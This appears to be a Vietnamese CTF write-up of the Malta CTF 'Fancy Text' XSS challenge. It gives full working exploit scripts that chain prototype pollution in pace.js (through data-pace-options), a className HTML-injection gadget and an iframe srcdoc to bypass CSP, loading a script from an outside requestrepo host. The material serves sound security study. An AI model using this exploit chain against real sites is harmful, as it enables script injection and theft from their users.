+++
title = 'FANCY TEXT'
date = 2025-06-23T18:30:32+02:00
tags = [
  "web",
  "204 points",
  "25 solves",
  "downgrade"
]
draft = true
+++

# Malta CTF 

> Giải này mình chỉ làm được có một bài thui .... bài đầu khá dễ nên mình sẽ viết về câu 2.

## Fancy text 
- Bài này là một bài XSS nhưng sử dụng DOMPURIFY latest và CSP để chặn hầu hết mọi đường .
Source code đơn giản như sau : 

*index.html*
```html
<head>
    <title>Fancy Text Generator!</title>
    <link href="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace-theme-center-atom.min.css" rel="stylesheet">
    <link href="/style.css" rel="stylesheet">
    <script integrity="sha256-1ltlTOtatSNq5nY+DSYtbldahmQSfsXkeBYmBH5i9dQ=" src="/loader.js"></script>
</head>

<body>
    <h1>Fancy text generator</h1>
    <div id="contentBox"><%- text || "fancy text generator!" %></div>
    </br>
    <form action="/" method="GET">
        <input name="text" placeholder="text to make fancy">
        <input type="submit" value="submit">
    </form>
</body>
```
*loader.js*
```js
scripts = {
    "pace": "https://cdn.jsdelivr.net/npm/pace-js@latest/pace.min.js",
    "main": "/main.js",
}

function appendScript(src) {
    let script = document.createElement('script');
    script.src = src;
    document.head.appendChild(script);
};

for (let script in scripts) {
    appendScript(scripts[script]);
}

```
main.js 
```js
const toFancyText = (text) => {
    const fancyLowerStart = 0x1D51E; // 'a'
    const fancyUpperMap = {
        A: 0x1D504, B: 0x1D505, C: 0x212D, D: 0x1D507, E: 0x1D508,
        F: 0x1D509, G: 0x1D50A, H: 0x210C, I: 0x2111, J: 0x1D50D,
        K: 0x1D50E, L: 0x1D50F, M: 0x1D510, N: 0x1D511, O: 0x1D512,
        P: 0x1D513, Q: 0x1D514, R: 0x211C, S: 0x1D516, T: 0x1D517,
        U: 0x1D518, V: 0x1D519, W: 0x1D51A, X: 0x1D51B, Y: 0x1D51C, Z: 0x2128
    };

    return [...text].map(char => {
        const code = char.charCodeAt(0);

        // a-z
        if (code >= 97 && code <= 122) {
            return String.fromCodePoint(fancyLowerStart + (code - 97));
        }

        // A-Z
        if (char in fancyUpperMap) {
            return String.fromCodePoint(fancyUpperMap[char]);
        }

        // Leave others (numbers, punctuation) unchanged
        return char;
    }).join('');
}

contentBox.innerText = toFancyText(contentBox.innerText)
```
*server.js*
```js
const express = require('express')
const app = express();
const createDOMPurify = require('dompurify');
const { JSDOM } = require('jsdom');

app.set('view engine', 'ejs');
app.use(express.static('static'))

app.use((req, res, next) => {
    res.set('Content-Security-Policy', "script-src 'sha256-1ltlTOtatSNq5nY+DSYtbldahmQSfsXkeBYmBH5i9dQ=' 'strict-dynamic'; object-src 'none';");
    next();
});

app.get('/', (req, res) => {
    const window = new JSDOM('').window;
    const DOMPurify = createDOMPurify(window);
    ///return res.render('index', {text: DOMPurify.sanitize(req.query.text)})
    return res.render('index', { text: req.query.text })
})

app.listen(process.env.PORT || 1337, () => {
    console.log(`listening on ${process.env.PORT || 1337}`)
})

```
## Chương trình này làm gì .
1. Cho phép user nhập input vào sau đó input sẽ đi qua hàm main và biến đổi sang các kí tự đặc biệt khác nhau.
2. Sử dụng script intergrity để chống việc file loader.js bị thay đổi nên ta có thể loại bỏ việc load một file script khác từ bên ngoài vào.
3. Dùng dompurify để loại bỏ hết các tag nguy hiểm.

Sau đó mình đọc hàm loader.js thì thấy nó có thể load script đến "/main.js" và "pace.js" .Sau khi check csp thì mình thấy nó thiếu base uri check . 
![image](https://hackmd.io/_uploads/B1zKFYSNlx.png)
- Nhưng Dompurify vẫn sẽ sanitize nó .
### Làm sao không bị ảnh hưởng bởi hàm fancy text.
- Lúc này mình vẫn không biết làm sao để lấy được xss nên mình nghĩ đến việc làm sao để truyền payload tùy ý vào mà không bị ảnh hưởng bởi fancyText đã. 

- Lúc này mình thấy có bug Dom clobbering ở chỗ 

```js
contentBox.innerText = toFancyText(contentBox.innerText)
```
- Vậy ta có thể chèn bất kì tag nào với id "contentBox" thì nó sẽ crash cái hàm main này và ta có thể dùng ***html injection***
- Nhưng vấn đề lớn nhất vẫn là Dompurify và mình đã bí từ đây..
- Sau đó mình nghĩ đến việc dom cloberring được biến **scripts**
![image](https://hackmd.io/_uploads/BJd4cKBNxe.png)
- Nhưng sau khi thử thì mình nhận ra Dompurify đã tính đến trường hợp này :vv .
Mình có thể clober "script" nhưng "scripts" thì không . Xem hình bên dưới  ( mình sẽ tìm hiểu vấn đề này sau...)
![image](https://hackmd.io/_uploads/Byk_5KS4lg.png)
![image](https://hackmd.io/_uploads/SyvuqFHEgg.png)
- Nhưng mình nhận ra là cho dù có dom cloberring được thì cũng chẳng có ý nghĩa gì vì javascript scope ở đây.
Vậy là tới đây mình bí toàn tập ....

## Đọc write up 
- Sau khi đọc write up mình đã nhận ra cái ngu của mình. 
- Đó là mình đã quên kiểm tra package "pace.js" được load vào .... Đáng lẽ ra mình phải kiểm tra mọi input được đi vào app của mình mới đúng. Đến đây thì đọc source của pace.js là được.
Sau đó thì mình tìm được report này vào năm 2024 , yeah 2024 :) 
https://github.com/CodeByZach/pace/issues/546
Một bug khá lớn nhưng có vẻ bên developers không còn maintain nữa.
Bản chất của bug này cũng là merge prototype thui.
```js =
extend = function() {
		var key, out, source, sources, val, _i, _len;
		out = arguments[0], sources = 2 <= arguments.length ? __slice.call(arguments, 1) : [];
		for (_i = 0, _len = sources.length; _i < _len; _i++) {
			source = sources[_i];
			if (source) {
				for (key in source) {
					if (!__hasProp.call(source, key)) continue;
					val = source[key];
					if ((out[key] != null) && typeof out[key] === 'object' && (val != null) && typeof val === 'object') {
						extend(out[key], val);
					} else {
						out[key] = val;
					}
				}
			}
		}
		return out;
	};
```

Và mình sẽ có thể **OBJECT PROTOTYPE** bất kì biến nào chỉ với : 
```html=
  <img id="data-pace-options" data-pace-options='{"__proto__": {"polluted": "YOU ARE POLLUTED!"}}'>
```
- Đến đây thì ý tưởng của bài write up là Object prototype một biến bất kì có giá trị bằng một script source của attacker . Mục đích chính là pollute biến **script** trong loader.js 
```js
scripts = {
    "pace": "https://cdn.jsdelivr.net/npm/pace-js@latest/pace.min.js",
    "main": "/main.js",
}

function appendScript(src) {
    let script = document.createElement('script');
    script.src = src;
    document.head.appendChild(script);
};

// This will loop through our "polluted" : "//attacker.js"
for (let script in scripts) {
    appendScript(scripts[script]);
}
```
- Đọc đến đây mình thấy khá bất ngờ khi object prototype có thể ảnh hưởng đến cả loop for in ? 
- Test thử thì mình thấy quả thật vậy;
```js
scripts = {
    "pace": "https://cdn.jsdelivr.net/npm/pace-js@latest/pace.min.js",
    "main": "/main.js",
}

Object.prototype.polluted = "FUCKED"
console.log("Just log it out : ", scripts)

for (let script in scripts) {
    console.log("[" + script + "] => " + scripts[script])
}

/*OUTPUT : 
Just log it out :  {
  pace: 'https://cdn.jsdelivr.net/npm/pace-js@latest/pace.min.js',
  main: '/main.js'
}
[pace] => https://cdn.jsdelivr.net/npm/pace-js@latest/pace.min.js
[main] => /main.js
[polluted] => FUCKED
*/
```
Hmmmm, nhìn rất lạ nhỉ .
![image](https://hackmd.io/_uploads/rkl90FBVge.png)

Sau khi đọc docs thì mình thấy for in sẽ loop qua những enumerables của chính nó và cả những enumerables của Object.prototype ~~
- Thông tin chi tiết về thế nào là enumberables chúng ta có thể xem ở đây : 
https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Enumerability_and_ownership_of_properties
Và các hàm để kiểm tra enumrables hay không : 
![image](https://hackmd.io/_uploads/SJbg1crExx.png)
Ta có thể thấy hàm in khi này sẽ xem Enumrable + inherited là true và chính vì thế script của mình sẽ bị polluted khi for in qua.
# Vấn đề cuối cùng
- Đọc write up thì mình thấy có vẻ còn một bug ở trong pace js để có thể chèn html injection nữa : 
```js
    var _custom_class_name = (options.className !== '') ? ' ' + options.className : '';
                this.el.innerHTML = '<div class="pace-progress' + _custom_class_name + '">\n  <div class="pace-progress-inner"></div>\n</div>\n<div class="pace-activity"></div>';
```
Đơn giản là dùng options className ròi inject vào nhưng vì mình đã có free html injection ròi nên làm ngắn thui..
```python
import requests


url ="https://fancy-text-generator-web.shared.challs.mt/"
url ="http://localhost:1337"

html = '''<img id="data-pace-options" data-pace-options='{"__proto__": {"polluted": "https://nj2n2pew.requestrepo.com/ex.js"}}'>
            '''
text =  html + '<a id ="contentBox">'
res = requests.get(url,params={"text":text})
print(res.text)
print(text)

```
Vậy là đã polluted thành công .
![image](https://hackmd.io/_uploads/BygxI9BNlg.png)
- Đến đây thì vấn đề là mình cần gọi script /loader.js một lần nữa để load vào nhưng mình không thể bypass được DOM purify . Cuối cùng vẫn phải dùng gadget className của pace js thui :vvv . Nó sẽ giúp mình bypass bằng cách mọi payload đều nằm trong một html attribute nên sẽ valid khi đi qua Dompurify.
- Sau một hồi ngồi escape các thứ thì mình có script sau : 
```python
import requests
import urllib.parse
import html



url ="http://localhost:1338"
url ="https://fancy-text-generator-web.shared.challs.mt"

options = ""

#htmls = '''<img id="data-pace-options" data-pace-options='{"__proto__": {"polluted": "https://nj2n2pew.requestrepo.com/ex.js"}}'><script>alert()</script>'''

def html_encode(s):
    return s.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;").replace('"', "&quot;").replace("'", "&#39;")

payload ='''aaaa\\"><script integrity=\\"sha256-1ltlTOtatSNq5nY+DSYtbldahmQSfsXkeBYmBH5i9dQ=\\" src=\\"/test.js?version=1\\"></script>'''
htmls = f'<img id="data-pace-options" data-pace-options=\'{{"startOnPageLoad":true,"__proto__":{{"polluted":"https://nj2n2pew.requestrepo.com/ex.js"}},"className": "{payload}"}}\'>'
text =  htmls + '<a id ="contentBox">'
res = requests.get(url,params={"text":text})
print(res.text)
print(payload)
print(url + "?text=" + urllib.parse.quote(text))

```
Đến đây thì script của mình được load rồi nhưng mà nó không gọi bất kì request nào cả ?
![image](https://hackmd.io/_uploads/B1yNWjrVlg.png)
![image](https://hackmd.io/_uploads/BkKVbsSNlg.png)
Vì sao ????
Đến đây thì mình mới nhớ là innerHTML không cho phép script chạy :vv . Bypass bằng iframe là xong 
```python
import requests
import urllib.parse
import html



url ="http://localhost:1338"
url ="https://fancy-text-generator-web.shared.challs.mt"

options = ""

#htmls = '''<img id="data-pace-options" data-pace-options='{"__proto__": {"polluted": ""}}'><script>alert()</img>'''

def html_encode(s):
    return s.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;").replace('"', "&quot;").replace("'", "&#39;")

payload ='''aaaa\\"><iframe srcdoc =\\"<script integrity=&amp;quot;sha256-1ltlTOtatSNq5nY+DSYtbldahmQSfsXkeBYmBH5i9dQ=&amp;quot; src=&amp;quot;/loader.js&amp;quot;></script><img id=&amp;quot;data-pace-options&amp;quot; data-pace-options=&amp;#39;{&amp;quot;__proto__&amp;quot;: {&amp;quot;polluted&amp;quot;: &amp;quot;https://nj2n2pew.requestrepo.com/ex.js&amp;quot;}}&amp;#39;>\\">'''
htmls = f'<img id="data-pace-options" data-pace-options=\'{{"startOnPageLoad":true,"__proto__":{{"polluted":"https://nj2n2pew.requestrepo.com/ex.js"}},"className": "{payload}"}}\'>'
text =  htmls + '<a id ="contentBox">'
res = requests.get(url,params={"text":text})
print(res.text)
print(payload)
print(url + "?text=" + urllib.parse.quote(text))

```
Đến đoạn này thì còn một vấn đề là loader.js của mình sẽ luôn được load trước khi pace-js được load . Mình có thể tạo một hanging server và gửi loader.js đúng với file ban đầu để không bị lỗi intergriti
```python
from flask import Flask, send_file
from flask_cors import CORS

import time 

app = Flask(__name__)
CORS(app)  # Enable CORS for all routes

@app.route('/loader.js')
def serve_js():
    time.sleep(3)
    return send_file('src/static/loader.js', mimetype='application/javascript')


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=3000)

```
Full script : 
```python
import requests
import urllib.parse
import html



url ="http://localhost:1338"
url ="https://fancy-text-generator-web.shared.challs.mt"

options = ""

#htmls = '''<img id="data-pace-options" data-pace-options='{"__proto__": {"polluted": ""}}'><script>alert()</img>'''

def html_encode(s):
    return s.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;").replace('"', "&quot;").replace("'", "&#39;")

payload ='''aaaa\\"><iframe srcdoc =\\"<img id=&amp;quot;data-pace-options&amp;quot; data-pace-options=&amp;#39;{&amp;quot;__proto__&amp;quot;: {&amp;quot;polluted&amp;quot;: &amp;quot;https://nj2n2pew.requestrepo.com/ex.js&amp;quot;}}&amp;#39;><script integrity=&amp;quot;sha256-1ltlTOtatSNq5nY+DSYtbldahmQSfsXkeBYmBH5i9dQ=&amp;quot; src=&amp;quot;/loader.js&amp;quot;></script><script integrity=&amp;quot;sha256-1ltlTOtatSNq5nY+DSYtbldahmQSfsXkeBYmBH5i9dQ=&amp;quot; src=&amp;quot;/loader.js&amp;quot;></script><script integrity=&amp;quot;sha256-1ltlTOtatSNq5nY+DSYtbldahmQSfsXkeBYmBH5i9dQ=&amp;quot; src=&amp;quot;/loader.js&amp;quot;></script><script integrity=&amp;quot;sha256-1ltlTOtatSNq5nY+DSYtbldahmQSfsXkeBYmBH5i9dQ=&amp;quot; src=&amp;quot;/loader.js&amp;quot;></script><script integrity=&amp;quot;sha256-1ltlTOtatSNq5nY+DSYtbldahmQSfsXkeBYmBH5i9dQ=&amp;quot; src=&amp;quot;/loader.js&amp;quot;></script><script integrity=&amp;quot;sha256-1ltlTOtatSNq5nY+DSYtbldahmQSfsXkeBYmBH5i9dQ=&amp;quot; src=&amp;quot;/loader.js&amp;quot;></script><script integrity=&amp;quot;sha256-1ltlTOtatSNq5nY+DSYtbldahmQSfsXkeBYmBH5i9dQ=&amp;quot; src=&amp;quot;/loader.js&amp;quot;></script><script integrity=&amp;quot;sha256-1ltlTOtatSNq5nY+DSYtbldahmQSfsXkeBYmBH5i9dQ=&amp;quot; src=&amp;quot;/loader.js&amp;quot;></script><script crossorigin=&amp;quot;anonymous&amp;quot;integrity=&amp;quot;sha256-1ltlTOtatSNq5nY+DSYtbldahmQSfsXkeBYmBH5i9dQ=&amp;quot; src=&amp;quot;https://commissioners-mozilla-messenger-compressed.trycloudflare.com/loader.js&amp;quot;></script>\\">'''
htmls = f'<img id="data-pace-options" data-pace-options=\'{{"startOnPageLoad":true,"__proto__":{{"polluted":"https://nj2n2pew.requestrepo.com/ex.js"}},"className": "{payload}"}}\'>'
text =  htmls + '<a id ="contentBox">'
res = requests.get(url,params={"text":text})
print(res.text)
print(payload)
print(url + "?text=" + urllib.parse.quote(text))

```
Dùng script với cross-origin = anonymous để request cors enabled.
Đến đây là xong bài rùi ...

flag : 
**maltactf{oops_my_dependency_is_buggy_05b19465ce19db4e28ddb00bb19f101e}**
# Cảm nhận : 
- Giải này khá là khoai :vv mới câu 2 thui mà mình đã quá ngu ròi. Thi xong sẽ quay lại làm mấy câu còn lại bruhh.
# Sai lầm :
1. Không kiểm tra hết input vào một app
2. Quá tin tưởng vào package latest :(
3. Skill issue khi làm việc với html entity encode

# New knowledge : 
-  Object prototype in latest pace-js
-  Enumerable inherit trong for in và vâng vâng
-  Script intergrity check 

# Audit sau giải
- Dompurify id "script" and "scripts"
- Style with background can make xs leak with no csp ? --